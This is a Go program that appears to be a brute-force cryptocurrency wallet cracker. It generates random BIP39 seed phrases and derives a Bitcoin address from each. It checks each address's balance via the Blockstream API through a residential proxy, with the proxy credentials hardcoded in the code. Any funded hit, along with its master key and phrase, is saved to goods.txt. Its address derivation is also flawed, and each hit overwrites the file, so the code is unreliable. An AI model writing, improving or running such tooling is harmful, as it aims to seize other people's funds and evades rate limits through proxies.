package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/FactomProject/go-bip32"
	"github.com/btcsuite/btcd/btcutil"
	"github.com/btcsuite/btcd/chaincfg"
	"github.com/tyler-smith/go-bip39"
)

const (
	workerCount = 100
)

func worker(phraseChan chan string, wg *sync.WaitGroup) {
	defer wg.Done()

	for phrase := range phraseChan {
		masterKey := getSeed(phrase)
		checkBitcoinBalance(masterKey, phrase)
	}
}

func getSeed(phrase string) *bip32.Key {
	seed := bip39.NewSeed(phrase, "")

	masterKey, err := bip32.NewMasterKey(seed)
	if err != nil {
		log.Printf("Failed to generate master key: %v", err)
		return nil
	}

	return masterKey
}

func main() {
	fmt.Println("Starting...")

	file, err := os.Open("wordlist.txt")
	if err != nil {
		panic(err)
	}
	defer file.Close()

	var words []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		words = append(words, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		panic(err)
	}

	if len(words) < 12 {
		panic("Wordlist too small")
	}

	rand.Seed(time.Now().UnixNano())

	phraseChan := make(chan string)
	var wg sync.WaitGroup

	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go worker(phraseChan, &wg)
	}

	for {
		selectedWords := make([]string, 12)
		for i := 0; i < 12; i++ {
			selectedWords[i] = words[rand.Intn(len(words))]
		}

		phrase := strings.Join(selectedWords, " ")

		if bip39.IsMnemonicValid(phrase) {
			phraseChan <- phrase
		}
	}
}

func checkBitcoinBalance(masterKey *bip32.Key, phrase string) {
	// Derive the Bitcoin address
	pubKey := masterKey.PublicKey()

	pubKeyHash := btcutil.Hash160(pubKey.Key)
	addr, err := btcutil.NewAddressPubKeyHash(pubKeyHash, &chaincfg.MainNetParams)
	if err != nil {
		log.Printf("Failed to derive Bitcoin address: %v", err)
		return
	}

	parts := strings.SplitN("residential.flashproxy.io:8082:7vBuJyvpSY8WxSRqm3VYOCCFhBdkxW:KuLAef8BDAOFKnbP_country-DE", ":", 4) // Split into maximum 4 parts

	if len(parts) < 4 {
		log.Printf("Invalid proxy format\n")
		return
	}

	username := parts[2]
	password := parts[3]
	proxyURL := fmt.Sprintf("http://%s:%s@%s:%s", username, password, parts[0], parts[1])

	urlParsed, err := url.Parse(proxyURL)
	if err != nil {
		log.Printf("Error parsing proxy URL: %v\n", err)
		return
	}

	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(urlParsed),
		},
		Timeout: 5 * time.Second,
	}

	// Check balance using Blockstream API
	url := fmt.Sprintf("https://blockstream.info/api/address/%s", addr.EncodeAddress())
	resp, err := client.Get(url)
	if err != nil {
		//log.Printf("Failed to retrieve balance: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		//log.Printf("Error getting balance: %v", resp.Status)
		return
	}

	var balance struct {
		ChainStats struct {
			FundedTxoSum int64 `json:"funded_txo_sum"`
		} `json:"chain_stats"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&balance); err != nil {
		log.Printf("Failed to decode balance: %v", err)
		return
	}

	if float64(balance.ChainStats.FundedTxoSum)/1e8 > 0.0000001 {
		file, err := os.Create("goods.txt")
		if err != nil {
			log.Printf("Failed to create file: %v", err)
			return
		}
		defer file.Close()

		// write the data to the file
		stringToWrite := fmt.Sprintf("Bitcoin address: %s\n, Master key: %s\n Balance: %f BTC\n Phrase: %s\n", addr.EncodeAddress(), masterKey.String(), float64(balance.ChainStats.FundedTxoSum)/1e8, phrase)

		_, err = file.WriteString(stringToWrite)
		if err != nil {
			log.Printf("Failed to write to file: %v", err)
			return
		}
	}
}
